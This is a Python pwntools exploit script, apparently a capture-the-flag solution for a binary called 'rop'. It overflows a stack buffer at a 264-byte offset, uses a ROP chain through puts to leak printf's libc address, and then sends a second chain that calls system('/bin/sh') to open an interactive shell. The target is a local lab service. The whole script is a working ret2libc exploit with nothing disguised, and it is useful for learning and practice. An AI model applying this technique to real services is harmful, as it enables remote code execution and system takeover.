#!/usr/bin/env python3

from pwn import *
import binascii
import os

exe = context.binary = ELF("rop")

if args.REMOTE:
    libc = ELF("./libc-docker.so")
else:
    libc = ELF("/usr/lib/libc.so.6")

remotehost = ("127.0.0.1", 22226)

context.binary = exe.path
context.terminal = ['st', '-e', 'sh', '-c']

gdbscript = '''
b *main
continue
'''.format(**locals())


def start(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(*remotehost, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


#################################################################

io = start()


rip_offset = 264
rsp_offset = rip_offset + 8


line = io.recvline(False)
main_addr = int(line.split(b":")[1], 0)
log.info("main address: %x" % (main_addr))
exe_segment = main_addr - 0x1169
log.info("exe segment: %x" % (exe_segment))

got_plt = exe_segment + 0x4000
got_plt_printf = got_plt + 0x20

exe_puts = exe_segment + 0x1030
pop_rdi_ret = exe_segment + 0x1263


payload = dict()

#
#  [main_addr]   [puts@plt]  [printf@got] [*pod_rdi_ret]
#

payload[rip_offset]      = p64(pop_rdi_ret)
payload[rip_offset + 8]  = p64(got_plt_printf)
payload[rip_offset + 16] = p64(exe_puts)
payload[rip_offset + 24] = p64(main_addr)


payload = fit(payload)

io.recvline()
io.sendline(payload)
io.recvline()

libc_printf = u64(io.recvline(False).ljust(8, b"\x00"))
libc_segment = libc_printf - 0x57220


log.info("printf address: %x" % (libc_printf))
log.info("libc address: %x" % (libc_segment))


libc_binsh = libc_segment + 0x18b143
libc_system = libc_segment + 0x49100

payload = dict()

payload[rip_offset]      = p64(pop_rdi_ret)
payload[rip_offset + 8]  = p64(libc_binsh)
payload[rip_offset + 16] = p64(libc_system)

payload = fit(payload)

io.recvline()
io.sendline(payload)
io.recvline()


io.interactive()